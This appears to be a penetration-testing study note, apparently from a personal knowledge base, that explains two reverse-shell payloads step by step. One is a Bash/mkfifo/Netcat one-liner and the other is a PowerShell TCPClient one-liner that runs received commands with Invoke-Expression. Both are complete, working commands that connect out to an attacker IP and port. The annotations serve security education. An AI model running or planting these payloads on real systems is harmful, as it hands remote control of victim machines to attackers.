---
id: General
aliases: []
tags:
  - Pentest/Shells/Payloads/General
---

# Payloads

In information security, the [Payload](https://en.wikipedia.org/wiki/Payload)
is the command and/or code that exploits the vulnerability in an OS
and/or application

___

<!-- Example {{{-->
## Example

<!-- Bash {{{-->
### Bash

[[Netcat]]/[[Bash/General|Bash]] reverse shell one-liner
common one-liner

Issued on a Linux system to serve a Bash shell
on a network socket, utilizing a Netcat listener

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

1. Remove the `/tmp/f` file if it exists

```sh
rm -f /tmp/f;
```

<!-- Info {{{-->
> [!info]-
>
> - `-f`: Ignore nonexistent files
>
<!-- }}} -->

2. Make a [FIFO named pipe](https://man7.org/linux/man-pages/man7/fifo.7.html)

```sh
mkfifo /tmp/f;
```

<!-- Info {{{-->
> [!info]-
>
> `/tmp/f`: FIFO named pipe file
>
<!-- }}} -->

3. Concatenate the FIFO named pipe file

```sh
cat /tmp/f |
```

4. Set shell options

```sh
/bin/bash -i 2>&1 |
```

<!-- Info {{{-->
> [!info]-
>
> - `-i`: Ensure interactive shell
> - `2>&1`: Ensure standard error data stream (`2`)
>   and standard output data stream (`1`)
>   are redirected to the command following the pipe (`|`)
>
<!-- }}} -->

5. [[Netcat]] - Open a connection

```sh
nc 10.10.14.12 7777 > /tmp/f
```

<!-- Info {{{-->
> [!info]-
>
> - Open a connection to the attacker machine
> - `7777` listen on port 7777
>
<!-- }}} -->

<!-- }}} -->

<!-- PowerShell {{{-->
### PowerShell

Example [[PowerShell/General|PowerShell]] one-liner
issued on a Windows machine, in a command-prompt

```sh
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

1. Call PowerShell

```sh
powershell -nop -c
```

<!-- Info {{{-->
> [!info]-
>
> - `powershell -nop`: Executes `powershell.exe` with no profile
> - `-c`: Execut the command/script block contained in the quotes
>
<!-- }}} -->

2. Bind a socket

```sh
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

<!-- Info {{{-->
> [!info]-
>
> Sets/evaluates the variable `$client` equal to (`=`)
> the `New-Object` cmdlet, which creates an instance
> of the `System.Net.Sockets.TCPClient` .NET framework object.
>
> The .NET framework object will connect with the TCP socket
> listed in the parentheses (`10.10.14.158,443`).
>
<!-- }}} -->

3. Set a command stream

```sh
$stream = $client.GetStream();
```

<!-- Info {{{-->
> [!info]-
>
> Sets/evaluates the variable `$stream` equal to (`=`)
> the `$client` variable and the .NET framework method
> called [GetStream](https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0)
> that facilitates network communications
>
<!-- }}} -->

4. Create an empty byte stream

```sh
[byte[]]$bytes = 0..65535|%{0};
```

<!-- Info {{{-->
> [!info]-
>
> Creates a byte type array (`[]`) called `$bytes`
> that returns 65,535 zeros as the values in the array.
>
> This is essentially an empty byte stream
> that will be directed to the TCP listener on an attack box
> awaiting a connection
>
<!-- }}} -->

5. Stream parameters

```sh
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

<!-- Info {{{-->
> [!info]-
>
> Starts a while loop containing the `$i` variable
> set equal to (`=`) the .NET framework
> [Stream.Read](https://learn.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)
> (`$stream.Read`) method
>
> The parameters: buffer (`$bytes`), offset (`0`),
> and count (`$bytes.Length`) are defined
> inside the parentheses of the method
>
<!-- }}} -->

6. Set the byte encoding

```sh
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

<!-- Info {{{-->
> [!info]-
>
> Sets/evaluates the variable `$data` equal to (`=`)
> an ASCII encoding .NET framework class
> that will be used in conjunction with the `GetString` method
> to encode the byte stream (`$bytes`) into ASCII.
>
> In short, what we type won't just be transmitted
> and received as empty bits but will be encoded as ASCII text
>
<!-- }}} -->

7. Invoke-Experssion

```sh
$sendback = (iex $data 2>&1 | Out-String );
```

<!-- Info {{{-->
> [!info]-
>
> Sets/evaluates the variable `$sendback` equal to (`=`)
> the Invoke-Expression (`iex`) cmdlet against the `$data` variable,
> then redirects the standard error (`2>`) `&` standard output (`1`)
> through a pipe (`|`) to the `Out-String` cmdlet
> which converts input objects into strings.
>
> Because Invoke-Expression is used,
> everything stored in `$data` will be run on the local computer.
>
<!-- }}} -->

8. Show working directory

```sh
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
```

<!-- Info {{{-->
> [!info]-
>
> Sets/evaluates the variable `$sendback2` equal to (`=`)
> the `$sendback` variable plus (`+`) the string PS (`'PS'`)
> plus `+` path to the working directory (`(pwd).path`)
> plus (`+`) the string `'> '`.
>
> This will result in the shell prompt being
>
> ```sh
> PS C:\workingdirectoryofmachine >
> ```
>
<!-- }}} -->

9. Set Sendbyte

```sh
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

<!-- Info {{{-->
> [!info]-
>
> Sets/evaluates the variable `$sendbyte` equal to (`=`)
> the ASCII encoded byte stream that will use a TCP client
> to initiate a PowerShell session
> with a Netcat listener running on the attack box
>
<!-- }}} -->

10. Terminate TCP connection

```sh
$client.Close()"
```

<!-- Info {{{-->
> [!info]-
>
> [TcpClient.Close](https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0)
> method will be used to when the connection is terminated
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
